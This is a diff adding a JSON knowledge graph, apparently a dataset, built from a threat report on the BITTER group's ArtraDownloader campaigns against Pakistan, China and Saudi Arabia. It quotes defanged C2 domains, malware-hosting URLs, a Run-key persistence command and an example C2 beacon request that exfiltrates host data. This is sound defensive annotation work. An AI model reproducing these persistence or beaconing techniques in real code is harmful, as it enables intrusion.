@@ -1,0 +1,856 @@
+{
+  "nodes": {
+    "high_level": [
+      {
+        "node_id": "HL_37d5f6714279",
+        "node_class": "high_level",
+        "node_type": "Location",
+        "node_text": "Pakistan",
+        "sentence_indices": [
+          0,
+          4,
+          6,
+          7,
+          8,
+          10,
+          27
+        ],
+        "span_sentences": [
+          "Since at least 2015, a suspected South Asian threat grouping known as BITTER has been targeting Pakistan and Chinese organizations using variants of a previously unreported downloader.",
+          "Starting in September 2018 and continuing through the beginning of 2019, BITTER launched a wave of attacks targeting Pakistan and Saudi Arabia.",
+          "Between mid-September 2018 and January 2019, Unit 42 observed the ArtraDownloader used in the targeting of Pakistan and Saudi Arabian organizations.",
+          "Several malicious documents have been identified, all communicating with likely compromised, legitimate Pakistan websites to retrieve the payload.",
+          "These websites include those associated with the Pakistan government and other Pakistan organizations.",
+          "Between November 2018 and January 2019, an engineering and hydraulics company in Pakistan, almasoodgroup[.]com was observed hosting two AtraDownloader executables as well as a malicious document used to deliver a payload.",
+          "They are observed targeting Pakistan, China, and Saudi Arabia using a customized downloader malware family named ArtraDownloader."
+        ],
+        "edges": []
+      },
+      {
+        "node_id": "HL_3b520e7d5fd6",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "BitterRAT",
+        "sentence_indices": [
+          3
+        ],
+        "span_sentences": [
+          "This downloader has frequently been observed downloading the Remote Access Trojan (RAT) BitterRAT which is associated with BITTER threat operations."
+        ],
+        "edges": [
+          "EDGE_6e56e6a61a1d"
+        ]
+      },
+      {
+        "node_id": "HL_3d9419e7e021",
+        "node_class": "high_level",
+        "node_type": "ThreatActor",
+        "node_text": "BITTER",
+        "sentence_indices": [
+          0,
+          3,
+          4,
+          5,
+          26
+        ],
+        "span_sentences": [
+          "Since at least 2015, a suspected South Asian threat grouping known as BITTER has been targeting Pakistan and Chinese organizations using variants of a previously unreported downloader.",
+          "This downloader has frequently been observed downloading the Remote Access Trojan (RAT) BitterRAT which is associated with BITTER threat operations.",
+          "Starting in September 2018 and continuing through the beginning of 2019, BITTER launched a wave of attacks targeting Pakistan and Saudi Arabia.",
+          "This is the first reported instance of BITTER targeting Saudi Arabia.",
+          "To date, the threat actor commonly referred to as BITTER continues to be active against various regions across the globe."
+        ],
+        "edges": []
+      },
+      {
+        "node_id": "HL_8793fb593279",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "ArtraDownloader",
+        "sentence_indices": [
+          1,
+          6,
+          9,
+          16,
+          18,
+          20,
+          27
+        ],
+        "span_sentences": [
+          "We have named this malware family ArtraDownloader based on a PDB string discovered within the samples.",
+          "Between mid-September 2018 and January 2019, Unit 42 observed the ArtraDownloader used in the targeting of Pakistan and Saudi Arabian organizations.",
+          "Beginning on Nov 6, 2018, the URL http://rmmun.org[.]pk/svch was observed hosting two ArtraDownloader files that communicated with the domains info.viewworld71[.]com or hewle.kielsoservice[.]net.",
+          "This payload is an instance of ArtraDownloader variant 1 exploits CVE-2017-11882 (EQNEDT).",
+          "In total, roughly 80 unique instances of the ArtraDownloader malware family have been discovered.",
+          "Overall, the ArtraDownloader malware family is not sophisticated, leveraging simple registry keys for persistence and HTTP requests to download and execute a remote file.",
+          "They are observed targeting Pakistan, China, and Saudi Arabia using a customized downloader malware family named ArtraDownloader."
+        ],
+        "edges": [
+          "EDGE_0071032259a0",
+          "EDGE_296bbe6f70fc",
+          "EDGE_32a2042b6388",
+          "EDGE_358bc61df97c",
+          "EDGE_7cac4f03c7fa",
+          "EDGE_ba1eb2e151f6",
+          "EDGE_c07997950918",
+          "EDGE_cb14a8dceebf",
+          "EDGE_d8cf38e8bbb4"
+        ]
+      },
+      {
+        "node_id": "HL_8d8305c76d1a",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "AVG",
+        "sentence_indices": [
+          35
+        ],
+        "span_sentences": [
+          "The malware proceeds to check to determine if the AVG security product is currently running on the system, however, this information does not appear to be used by ArtraDownloader."
+        ],
+        "edges": []
+      },
+      {
+        "node_id": "HL_8f229c579a9b",
+        "node_class": "high_level",
+        "node_type": "Location",
+        "node_text": "Saudi Arabia",
+        "sentence_indices": [
+          4,
+          5,
+          6,
+          27
+        ],
+        "span_sentences": [
+          "Starting in September 2018 and continuing through the beginning of 2019, BITTER launched a wave of attacks targeting Pakistan and Saudi Arabia.",
+          "This is the first reported instance of BITTER targeting Saudi Arabia.",
+          "Between mid-September 2018 and January 2019, Unit 42 observed the ArtraDownloader used in the targeting of Pakistan and Saudi Arabian organizations.",
+          "They are observed targeting Pakistan, China, and Saudi Arabia using a customized downloader malware family named ArtraDownloader."
+        ],
+        "edges": []
+      },
+      {
+        "node_id": "HL_9dfd2d6e4b41",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "MY24",
+        "sentence_indices": [
+          23
+        ],
+        "span_sentences": [
+          "In November 2017 we reported on malicious documents that were downloaded from the domain zmwardrobe[.]com and subsequently executed a payload referred to as MY24."
+        ],
+        "edges": []
+      },
+      {
+        "node_id": "HL_a87a238c89f2",
+        "node_class": "high_level",
+        "node_type": "Location",
+        "node_text": "China",
+        "sentence_indices": [
+          27
+        ],
+        "span_sentences": [
+          "They are observed targeting Pakistan, China, and Saudi Arabia using a customized downloader malware family named ArtraDownloader."
+        ],
+        "edges": []
+      },
+      {
+        "node_id": "HL_fc573577a13d",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Pakistan government",
+        "sentence_indices": [
+          8
+        ],
+        "span_sentences": [
+          "These websites include those associated with the Pakistan government and other Pakistan organizations."
+        ],
+        "edges": []
+      }
+    ],
+    "ttp": [
+      {
+        "node_id": "TTP_T1027",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1027",
+        "ttp_id": "T1027",
+        "best_span_sentences_list": [
+          [
+            "The following example GET request is made to the remote C2 server:\nGET /ourtyaz/qwe.php?TIe=214cf8g5.cgc9.51gb.914d.f17ceg%3ae4cc7*XJO.82GO2QF2BU9*%3aACme%3b%217%2f2%2f8712%21Tfswjdf%21Qbdl%212 HTTP/1.1\nHost: frameworksupport[.]net\nConnection: close\nIn the example request above, the data supplied in the TIe GET variable is separated by a * and the remaining data is encoded by adding one to each byte."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            33,
+            33
+          ]
+        ],
+        "edges": [
+          "EDGE_d8cf38e8bbb4"
+        ]
+      },
+      {
+        "node_id": "TTP_T1059",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1059",
+        "ttp_id": "T1059",
+        "best_span_sentences_list": [
+          [
+            "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run – cmd /c start %AppId% && exit\nAdditionally, in a separate thread, the malware will spawn a new process to copy itself to the C:\\intel\\msdtcv.exe path."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            30,
+            30
+          ]
+        ],
+        "edges": [
+          "EDGE_cb14a8dceebf"
+        ]
+      },
+      {
+        "node_id": "TTP_T1071",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1071",
+        "ttp_id": "T1071",
+        "best_span_sentences_list": [
+          [
+            "Several malicious documents have been identified, all communicating with likely compromised, legitimate Pakistan websites to retrieve the payload."
+          ],
+          [
+            "In this case it was observed using the command and control domain of hewle.kielsoservice[.]net/Engset.php."
+          ],
+          [
+            "Overall, the ArtraDownloader malware family is not sophisticated, leveraging simple registry keys for persistence and HTTP requests to download and execute a remote file."
+          ],
+          [
+            "The following example GET request is made to the remote C2 server:\nGET /ourtyaz/qwe.php?TIe=214cf8g5.cgc9.51gb.914d.f17ceg%3ae4cc7*XJO.82GO2QF2BU9*%3aACme%3b%217%2f2%2f8712%21Tfswjdf%21Qbdl%212 HTTP/1.1\nHost: frameworksupport[.]net\nConnection: close\nIn the example request above, the data supplied in the TIe GET variable is separated by a * and the remaining data is encoded by adding one to each byte."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            7,
+            7
+          ],
+          [
+            17,
+            17
+          ],
+          [
+            20,
+            20
+          ],
+          [
+            33,
+            33
+          ]
+        ],
+        "edges": [
+          "EDGE_01e40a1561c2",
+          "EDGE_286d35d2237d",
+          "EDGE_77835f43b485",
+          "EDGE_ac4ee58e64c1",
+          "EDGE_c07997950918",
+          "EDGE_d99f273dc993"
+        ]
+      },
+      {
+        "node_id": "TTP_T1082",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1082",
+        "ttp_id": "T1082",
+        "best_span_sentences_list": [
+          [
+            "Various information about the victim machine is collected, including information about the operating system, the machine’s GUID, as well as the hostname."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            31,
+            31
+          ]
+        ],
+        "edges": [
+          "EDGE_296bbe6f70fc"
+        ]
+      },
+      {
+        "node_id": "TTP_T1105",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1105",
+        "ttp_id": "T1105",
+        "best_span_sentences_list": [
+          [
+            "This downloader has frequently been observed downloading the Remote Access Trojan (RAT) BitterRAT which is associated with BITTER threat operations."
+          ],
+          [
+            "Several malicious documents have been identified, all communicating with likely compromised, legitimate Pakistan websites to retrieve the payload."
+          ],
+          [
+            "Beginning on Nov 6, 2018, the URL http://rmmun.org[.]pk/svch was observed hosting two ArtraDownloader files that communicated with the domains info.viewworld71[.]com or hewle.kielsoservice[.]net.",
+            "Between November 2018 and January 2019, an engineering and hydraulics company in Pakistan, almasoodgroup[.]com was observed hosting two AtraDownloader executables as well as a malicious document used to deliver a payload.",
+            "One of the files, Port Details.doc is an RTF document crafted to exploit the EQNEDT vulnerability CVE-2017-11882.",
+            "This file downloaded a payload that also communicated with the domain hewle.kielsoservice[.]net."
+          ],
+          [
+            "On December 17 and 18 2018, a file was downloaded from http://fst.gov[.]pk/images/winsvc (SHA256: ef0cb0a1…) after a user accessed the document cocktail and the dinner in the last week of dec.doc."
+          ],
+          [
+            "Overall, the ArtraDownloader malware family is not sophisticated, leveraging simple registry keys for persistence and HTTP requests to download and execute a remote file."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            3,
+            3
+          ],
+          [
+            7,
+            7
+          ],
+          [
+            9,
+            12
+          ],
+          [
+            14,
+            14
+          ],
+          [
+            20,
+            20
+          ]
+        ],
+        "edges": [
+          "EDGE_065e7814fa75",
+          "EDGE_32a2042b6388",
+          "EDGE_69c1043336d0",
+          "EDGE_6e56e6a61a1d",
+          "EDGE_ce624a1ad635",
+          "EDGE_db83eef9cda6",
+          "EDGE_ed1d88571042"
+        ]
+      },
+      {
+        "node_id": "TTP_T1112",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1112",
+        "ttp_id": "T1112",
+        "best_span_sentences_list": [
+          [
+            "It creates the following registry if it doesn’t already exist with the intent of persisting on the victim machine:\nHKCU\\Environment\\AppId – c:\\intel\\msdtcv.exe\nArtraDownloader then sets the following registry key to ensure that the malware executes across reboots."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            29,
+            29
+          ]
+        ],
+        "edges": [
+          "EDGE_7cac4f03c7fa",
+          "EDGE_ad201fb937ce",
+          "EDGE_eb0d34dbd9bb"
+        ]
+      },
+      {
+        "node_id": "TTP_T1203",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1203",
+        "ttp_id": "T1203",
+        "best_span_sentences_list": [
+          [
+            "Beginning on Nov 6, 2018, the URL http://rmmun.org[.]pk/svch was observed hosting two ArtraDownloader files that communicated with the domains info.viewworld71[.]com or hewle.kielsoservice[.]net.",
+            "Between November 2018 and January 2019, an engineering and hydraulics company in Pakistan, almasoodgroup[.]com was observed hosting two AtraDownloader executables as well as a malicious document used to deliver a payload.",
+            "One of the files, Port Details.doc is an RTF document crafted to exploit the EQNEDT vulnerability CVE-2017-11882.",
+            "This file downloaded a payload that also communicated with the domain hewle.kielsoservice[.]net.",
+            "The other two files hosted on the engineering company’s domain communicated with command and control domain xiovo426[.]net."
+          ],
+          [
+            "This payload is an instance of ArtraDownloader variant 1 exploits CVE-2017-11882 (EQNEDT)."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            9,
+            13
+          ],
+          [
+            16,
+            16
+          ]
+        ],
+        "edges": [
+          "EDGE_21fe45ddd4c1",
+          "EDGE_358bc61df97c"
+        ]
+      },
+      {
+        "node_id": "TTP_T1204",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1204",
+        "ttp_id": "T1204",
+        "best_span_sentences_list": [
+          [
+            "Between November 2018 and January 2019, an engineering and hydraulics company in Pakistan, almasoodgroup[.]com was observed hosting two AtraDownloader executables as well as a malicious document used to deliver a payload."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            10,
+            10
+          ]
+        ],
+        "edges": [
+          "EDGE_ba1eb2e151f6"
+        ]
+      },
+      {
+        "node_id": "TTP_T1547",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1547",
+        "ttp_id": "T1547",
+        "best_span_sentences_list": [
+          [
+            "Overall, the ArtraDownloader malware family is not sophisticated, leveraging simple registry keys for persistence and HTTP requests to download and execute a remote file."
+          ],
+          [
+            "It creates the following registry if it doesn’t already exist with the intent of persisting on the victim machine:\nHKCU\\Environment\\AppId – c:\\intel\\msdtcv.exe\nArtraDownloader then sets the following registry key to ensure that the malware executes across reboots.",
+            "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run – cmd /c start %AppId% && exit\nAdditionally, in a separate thread, the malware will spawn a new process to copy itself to the C:\\intel\\msdtcv.exe path."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            20,
+            20
+          ],
+          [
+            29,
+            30
+          ]
+        ],
+        "edges": [
+          "EDGE_0071032259a0",
+          "EDGE_469212dfb032",
+          "EDGE_a561e3647032",
+          "EDGE_c1829d996e8d"
+        ]
+      }
+    ],
+    "ioc": [
+      {
+        "node_id": "IOC_035560702793",
+        "node_class": "ioc",
+        "node_type": "RegistryKey",
+        "node_text": "HKCU\\Environment\\AppId",
+        "sentence_indices": [
+          29
+        ],
+        "span_sentences": [
+          "It creates the following registry if it doesn’t already exist with the intent of persisting on the victim machine:\nHKCU\\Environment\\AppId – c:\\intel\\msdtcv.exe\nArtraDownloader then sets the following registry key to ensure that the malware executes across reboots."
+        ],
+        "edges": [
+          "EDGE_a561e3647032",
+          "EDGE_ad201fb937ce"
+        ]
+      },
+      {
+        "node_id": "IOC_03a7a8da624c",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "xiovo426[.]net",
+        "sentence_indices": [
+          13
+        ],
+        "span_sentences": [
+          "The other two files hosted on the engineering company’s domain communicated with command and control domain xiovo426[.]net."
+        ],
+        "edges": [
+          "EDGE_01e40a1561c2"
+        ]
+      },
+      {
+        "node_id": "IOC_1b66dc1557d4",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "frameworksupport[.]net",
+        "sentence_indices": [
+          33
+        ],
+        "span_sentences": [
+          "The following example GET request is made to the remote C2 server:\nGET /ourtyaz/qwe.php?TIe=214cf8g5.cgc9.51gb.914d.f17ceg%3ae4cc7*XJO.82GO2QF2BU9*%3aACme%3b%217%2f2%2f8712%21Tfswjdf%21Qbdl%212 HTTP/1.1\nHost: frameworksupport[.]net\nConnection: close\nIn the example request above, the data supplied in the TIe GET variable is separated by a * and the remaining data is encoded by adding one to each byte."
+        ],
+        "edges": [
+          "EDGE_ac4ee58e64c1"
+        ]
+      },
+      {
+        "node_id": "IOC_2ba1432a90dd",
+        "node_class": "ioc",
+        "node_type": "Hash",
+        "node_text": "ef0cb0a1…",
+        "sentence_indices": [
+          14
+        ],
+        "span_sentences": [
+          "On December 17 and 18 2018, a file was downloaded from http://fst.gov[.]pk/images/winsvc (SHA256: ef0cb0a1…) after a user accessed the document cocktail and the dinner in the last week of dec.doc."
+        ],
+        "edges": [
+          "EDGE_69c1043336d0"
+        ]
+      },
+      {
+        "node_id": "IOC_4974e332a548",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "http://rmmun.org[.]pk/svch",
+        "sentence_indices": [
+          9
+        ],
+        "span_sentences": [
+          "Beginning on Nov 6, 2018, the URL http://rmmun.org[.]pk/svch was observed hosting two ArtraDownloader files that communicated with the domains info.viewworld71[.]com or hewle.kielsoservice[.]net."
+        ],
+        "edges": [
+          "EDGE_ed1d88571042"
+        ]
+      },
+      {
+        "node_id": "IOC_50b98ed96b0d",
+        "node_class": "ioc",
+        "node_type": "RegistryKey",
+        "node_text": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+        "sentence_indices": [
+          30
+        ],
+        "span_sentences": [
+          "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run – cmd /c start %AppId% && exit\nAdditionally, in a separate thread, the malware will spawn a new process to copy itself to the C:\\intel\\msdtcv.exe path."
+        ],
+        "edges": [
+          "EDGE_469212dfb032",
+          "EDGE_eb0d34dbd9bb"
+        ]
+      },
+      {
+        "node_id": "IOC_5ff64d829519",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "C:\\regdl.exe",
+        "sentence_indices": [
+          42
+        ],
+        "span_sentences": [
+          "As an example, should this malware originally be executed from C:\\, the downloaded file would be written to C:\\regdl.exe."
+        ],
+        "edges": [
+          "EDGE_db83eef9cda6"
+        ]
+      },
+      {
+        "node_id": "IOC_7549eadcd1d4",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "http://fst.gov[.]pk/images/winsvc",
+        "sentence_indices": [
+          14
+        ],
+        "span_sentences": [
+          "On December 17 and 18 2018, a file was downloaded from http://fst.gov[.]pk/images/winsvc (SHA256: ef0cb0a1…) after a user accessed the document cocktail and the dinner in the last week of dec.doc."
+        ],
+        "edges": [
+          "EDGE_065e7814fa75"
+        ]
+      },
+      {
+        "node_id": "IOC_8b88e869c241",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "hewle.kielsoservice[.]net",
+        "sentence_indices": [
+          9,
+          12,
+          17
+        ],
+        "span_sentences": [
+          "Beginning on Nov 6, 2018, the URL http://rmmun.org[.]pk/svch was observed hosting two ArtraDownloader files that communicated with the domains info.viewworld71[.]com or hewle.kielsoservice[.]net.",
+          "This file downloaded a payload that also communicated with the domain hewle.kielsoservice[.]net.",
+          "In this case it was observed using the command and control domain of hewle.kielsoservice[.]net/Engset.php."
+        ],
+        "edges": [
+          "EDGE_d99f273dc993"
+        ]
+      },
+      {
+        "node_id": "IOC_9c59c7073e89",
+        "node_class": "ioc",
+        "node_type": "CVE",
+        "node_text": "CVE-2017-11882",
+        "sentence_indices": [
+          11,
+          16
+        ],
+        "span_sentences": [
+          "One of the files, Port Details.doc is an RTF document crafted to exploit the EQNEDT vulnerability CVE-2017-11882.",
+          "This payload is an instance of ArtraDownloader variant 1 exploits CVE-2017-11882 (EQNEDT)."
+        ],
+        "edges": [
+          "EDGE_21fe45ddd4c1"
+        ]
+      },
+      {
+        "node_id": "IOC_9d6878e541d2",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "hewle.kielsoservice[.]net/Engset.php",
+        "sentence_indices": [
+          17
+        ],
+        "span_sentences": [
+          "In this case it was observed using the command and control domain of hewle.kielsoservice[.]net/Engset.php."
+        ],
+        "edges": [
+          "EDGE_286d35d2237d"
+        ]
+      },
+      {
+        "node_id": "IOC_af0f9af7685e",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "zmwardrobe[.]com",
+        "sentence_indices": [
+          23
+        ],
+        "span_sentences": [
+          "In November 2017 we reported on malicious documents that were downloaded from the domain zmwardrobe[.]com and subsequently executed a payload referred to as MY24."
+        ],
+        "edges": [
+          "EDGE_ce624a1ad635"
+        ]
+      },
+      {
+        "node_id": "IOC_afe220cbcea6",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "C:\\intel\\",
+        "sentence_indices": [
+          28
+        ],
+        "span_sentences": [
+          "It proceeds to attempt to create the C:\\intel\\ directory, which is where various files will eventually be stored."
+        ],
+        "edges": []
+      },
+      {
+        "node_id": "IOC_b1ec5987a5ea",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "almasoodgroup[.]com",
+        "sentence_indices": [
+          10
+        ],
+        "span_sentences": [
+          "Between November 2018 and January 2019, an engineering and hydraulics company in Pakistan, almasoodgroup[.]com was observed hosting two AtraDownloader executables as well as a malicious document used to deliver a payload."
+        ],
+        "edges": []
+      },
+      {
+        "node_id": "IOC_bc25f1d194af",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "c:\\intel\\msdtcv.exe",
+        "sentence_indices": [
+          29
+        ],
+        "span_sentences": [
+          "It creates the following registry if it doesn’t already exist with the intent of persisting on the victim machine:\nHKCU\\Environment\\AppId – c:\\intel\\msdtcv.exe\nArtraDownloader then sets the following registry key to ensure that the malware executes across reboots."
+        ],
+        "edges": [
+          "EDGE_c1829d996e8d"
+        ]
+      },
+      {
+        "node_id": "IOC_c6fef7253362",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "info.viewworld71[.]com",
+        "sentence_indices": [
+          9
+        ],
+        "span_sentences": [
+          "Beginning on Nov 6, 2018, the URL http://rmmun.org[.]pk/svch was observed hosting two ArtraDownloader files that communicated with the domains info.viewworld71[.]com or hewle.kielsoservice[.]net."
+        ],
+        "edges": [
+          "EDGE_77835f43b485"
+        ]
+      }
+    ]
+  },
+  "edges": [
+    {
+      "edge_id": "EDGE_0071032259a0",
+      "node_u": "HL_8793fb593279",
+      "node_v": "TTP_T1547",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_01e40a1561c2",
+      "node_u": "IOC_03a7a8da624c",
+      "node_v": "TTP_T1071",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_065e7814fa75",
+      "node_u": "IOC_7549eadcd1d4",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_21fe45ddd4c1",
+      "node_u": "IOC_9c59c7073e89",
+      "node_v": "TTP_T1203",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_286d35d2237d",
+      "node_u": "IOC_9d6878e541d2",
+      "node_v": "TTP_T1071",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_296bbe6f70fc",
+      "node_u": "HL_8793fb593279",
+      "node_v": "TTP_T1082",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_32a2042b6388",
+      "node_u": "HL_8793fb593279",
+      "node_v": "TTP_T1105",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_358bc61df97c",
+      "node_u": "HL_8793fb593279",
+      "node_v": "TTP_T1203",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_469212dfb032",
+      "node_u": "IOC_50b98ed96b0d",
+      "node_v": "TTP_T1547",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_69c1043336d0",
+      "node_u": "IOC_2ba1432a90dd",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_6e56e6a61a1d",
+      "node_u": "HL_3b520e7d5fd6",
+      "node_v": "TTP_T1105",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_77835f43b485",
+      "node_u": "IOC_c6fef7253362",
+      "node_v": "TTP_T1071",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_7cac4f03c7fa",
+      "node_u": "HL_8793fb593279",
+      "node_v": "TTP_T1112",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_a561e3647032",
+      "node_u": "IOC_035560702793",
+      "node_v": "TTP_T1547",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_ac4ee58e64c1",
+      "node_u": "IOC_1b66dc1557d4",
+      "node_v": "TTP_T1071",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_ad201fb937ce",
+      "node_u": "IOC_035560702793",
+      "node_v": "TTP_T1112",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_ba1eb2e151f6",
+      "node_u": "HL_8793fb593279",
+      "node_v": "TTP_T1204",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_c07997950918",
+      "node_u": "HL_8793fb593279",
+      "node_v": "TTP_T1071",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_c1829d996e8d",
+      "node_u": "IOC_bc25f1d194af",
+      "node_v": "TTP_T1547",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_cb14a8dceebf",
+      "node_u": "HL_8793fb593279",
+      "node_v": "TTP_T1059",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_ce624a1ad635",
+      "node_u": "IOC_af0f9af7685e",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_d8cf38e8bbb4",
+      "node_u": "HL_8793fb593279",
+      "node_v": "TTP_T1027",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_d99f273dc993",
+      "node_u": "IOC_8b88e869c241",
+      "node_v": "TTP_T1071",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_db83eef9cda6",
+      "node_u": "IOC_5ff64d829519",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_eb0d34dbd9bb",
+      "node_u": "IOC_50b98ed96b0d",
+      "node_v": "TTP_T1112",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_ed1d88571042",
+      "node_u": "IOC_4974e332a548",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    }
+  ]
+}
